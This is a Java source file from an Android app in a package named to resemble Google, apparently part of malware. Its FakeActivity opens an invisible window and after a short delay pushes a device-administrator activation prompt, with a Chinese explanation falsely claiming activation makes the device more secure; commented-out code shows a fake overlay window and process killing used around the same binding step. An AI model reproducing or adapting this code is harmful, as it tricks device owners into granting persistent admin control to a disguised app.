package com.googl.plugin.x;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.os.Handler;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-22
 * Time: PM12:12
 * To change this template use File | Settings | File Templates.
 */
public class FakeActivity extends Activity {

//    private FakeWindow window;
    private Handler mHandler = new Handler();

//    public static final String BIND_SUCCESS_ACTION = "com.bind.action.success";
//    private BroadcastReceiver mBindSuccesBRC = new BroadcastReceiver() {
//        @Override
//        public void onReceive(Context context, Intent intent) {
//            Config.LOGD("[[BroadcastReceiver::onReceive]] binding devices success >>>>>");
//            UtilsRuntime.goHome(getApplicationContext());
//
//            mHandler.postDelayed(new Runnable() {
//                @Override
//                public void run() {
////                    ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
////                    activityManager.killBackgroundProcesses("com.android.settings");
//                    android.os.Process.killProcess(android.os.Process.myPid());
//                }
//            }, 500);
//        }
//    };

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Config.LOGD("[[FakeActivity::onCreate]]");

        this.getWindow().setBackgroundDrawable(new ColorDrawable(0x00000000));

//        Intent i = new Intent();
//        i.setClass(getApplicationContext(), FakeService.class);
//        i.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
//        startService(i);

        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, new ComponentName(getApplicationContext(), DeviceBindBRC.class));
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活会使您的设备更安全");
                i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                startActivityForResult(i, 1000);
            }
        }, 250);

//        mHandler.postDelayed(new Runnable() {
//            @Override
//            public void run() {
//                window = new FakeWindow(getApplicationContext(), new FakeWindow.WindowListener() {
//
//                    @Override
//                    public void onWindowPreDismiss() {
//                        UtilsRuntime.goHome(getApplicationContext());
//                    }
//
//                    @Override
//                    public void onWindowDismiss() {
//                        window = null;
//                        mHandler.postDelayed(new Runnable() {
//                            @Override
//                            public void run() {
//                                Config.LOGD("[[FakeActivity::postDelayed]] try to finish process >>>>>>>");
//
////                                ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
////                                activityManager.killBackgroundProcesses("com.android.settings");
//                                PluginSettingManager.getInstance().setDeviceBindingCount(PluginSettingManager.getInstance().getDeviceBindingCount() + 1);
//
//                                android.os.Process.killProcess(android.os.Process.myPid());
//                            }
//                        }, 200);
//                    }
//                });
//                window.show();
//                window.updateTimerCount();
//            }
//        }, 100);
    }

    @Override
    public void onStart() {
        super.onStart();
        Config.LOGD("[[FakeActivity::onStart]]");
        MobclickAgent.onResume(getApplicationContext());
    }

    @Override
    public void onStop() {
        super.onStop();
        Config.LOGD("[[FakeActivity::onStop]]");
        MobclickAgent.onPause(getApplicationContext());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Config.LOGD("[[FakeActivity::onDestroy]]");
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, android.content.Intent data) {
        if (requestCode == 1000) {
            AppRuntime.ACTIVE_LEFT_BUTTON.set(true);
            finish();
        }
    }

}